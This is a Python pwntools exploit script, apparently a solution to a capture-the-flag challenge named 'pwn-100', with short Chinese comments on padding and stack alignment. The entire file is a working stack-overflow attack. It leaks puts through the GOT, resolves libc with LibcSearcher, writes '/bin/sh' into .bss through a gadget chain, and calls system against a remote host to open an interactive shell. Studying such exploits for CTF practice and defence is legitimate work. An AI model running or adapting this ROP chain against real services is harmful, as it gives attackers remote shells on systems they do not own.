#!/usr/bin/env python
# coding=utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
p= remote("61.147.171.105",53280)
#p = process('./pwn-100')
elf = ELF('./pwn-100')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']

pop_rdi = 0x0000000000400763
pop6 = 0x040075A
mov3 = 0x0400740

main = 0x0400550

#leak puts_addr
payload1 = b'a'*0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
payload1 = payload1.ljust(200, b'b')
p.send(payload1)
p.recvuntil(b'bye~\x0a')
puts_addr = u64(p.recvuntil('\x0a')[:-1].ljust(8, b'\x00'))
print (hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')

#write /bin/sh in .bss
payload2 = b'a'*0x48 + p64(pop6) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(0x601040) + p64(0)
payload2 += p64(mov3) + b'a'*56 + p64(main) #此处56=7*8，mov3执行完按照顺序就返回到了pop6的位置，而pop6占7行，64位每行8字节，用56个覆盖后才能布置返回地址为_start
payload2 = payload2.ljust(200, b'b')
p.send(payload2)
p.recvuntil(b'bye~\x0a')
p.send('/bin/sh\0')

#pause()
#get shell
print('get shell:')
payload3 = b'a'*0x48 + p64(0x04006FF) + p64(pop_rdi) + p64(0x601040) + p64(system_addr) + p64(0xdeadbeef) #这里千万记得64位要进行堆栈平衡！！！又被坑了一次。。。网上的wp就没堆栈平衡
payload3 = payload3.ljust(200, b'b')
p.send(payload3)
p.interactive()
